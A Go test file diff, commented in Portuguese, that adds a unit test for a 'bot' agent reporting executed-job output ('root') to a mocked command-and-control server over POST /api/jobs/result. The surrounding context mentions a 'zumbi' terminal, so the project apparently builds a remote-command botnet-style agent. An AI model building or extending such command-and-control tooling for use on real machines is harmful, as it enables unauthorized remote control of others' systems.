@@ -94,3 +94,37 @@ func TestAgentHTTP_ExecuteJob(t *testing.T) {
 		t.Errorf("Esperava que o terminal devolvesse 'zumbi\\n', mas retornou '%s'", output)
 	}
 }
+
+func TestAgentHTTP_SendJobResult(t *testing.T) {
+	// 1. Mock do C&C: O Servidor Falso espera receber o relatório
+	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		// Verifica se o Agente está batendo na rota certa
+		if r.URL.Path != "/api/jobs/result" || r.Method != http.MethodPost {
+			t.Fatalf("O Agente tentou acessar %s %s, mas deveria ser POST /api/jobs/result", r.Method, r.URL.Path)
+		}
+
+		// Valida se o DTO enviado pelo Agente está correto
+		var req map[string]string
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+			t.Fatalf("O Agente não enviou um JSON válido: %v", err)
+		}
+
+		if req["job_id"] != "job-teste-123" || req["output"] != "root\n" {
+			t.Errorf("O Agente enviou os dados errados para o C&C: %+v", req)
+		}
+
+		w.WriteHeader(http.StatusOK) // O Mestre agradece
+	}))
+	defer mockServer.Close()
+
+	// 2. Especificação: Instanciamos o AgenteHTTP
+	var bot = agent.NewAgentHTTP(mockServer.URL)
+
+	// 3. Ação: O Agente envia o resultado da execução para o servidor
+	err := bot.SendJobResult("job-teste-123", "root\n")
+	
+	// 4. Validação
+	if err != nil {
+		t.Fatalf("O Agente falhou ao tentar relatar o resultado: %v", err)
+	}
+}
